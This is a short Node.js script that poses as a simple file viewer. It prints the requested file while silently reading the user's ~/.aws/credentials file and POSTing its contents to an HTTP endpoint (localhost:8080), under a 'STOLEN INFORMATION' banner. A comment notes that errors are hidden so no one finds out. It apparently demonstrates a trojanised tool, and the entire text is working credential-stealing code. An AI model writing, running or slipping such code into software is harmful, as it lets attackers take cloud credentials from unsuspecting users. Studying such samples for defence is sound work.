const  readFile  = require('fs').readFile
const  homedir = require('os').homedir
const  request = require('request')

const filename = process.argv[2]

async function  sendDataOverHTTP(data) {
   return request.post('http://localhost:8080/', {
       body: data
   }, (err, resp, body) => {
       console.log("--------------------------------------------------")
       console.log("-             STOLEN INFORMATION                 -")
       console.log(body)
       console.log("--------------------------------------------------")
   })
}

async function gatherAWSCredentials() {
   const awsCredsFile = homedir() + "/.aws/credentials"
   return readFile(awsCredsFile, async (err, cnt) => {
       if(err) {
           //ignore silently since we don't want anyone to know about it
           console.error(err)
           return;
       }
       return await sendDataOverHTTP(cnt.toString())
   })
}

readFile(filename, async (err, cnt) => {
   if(err) {
       console.error(err)
       exit(1)
   }
   await gatherAWSCredentials()
   console.log("==== THIS IS WHAT YOU WERE EXPECTING TO SEE ====")
   console.log(cnt.toString())
   console.log("================================================")
})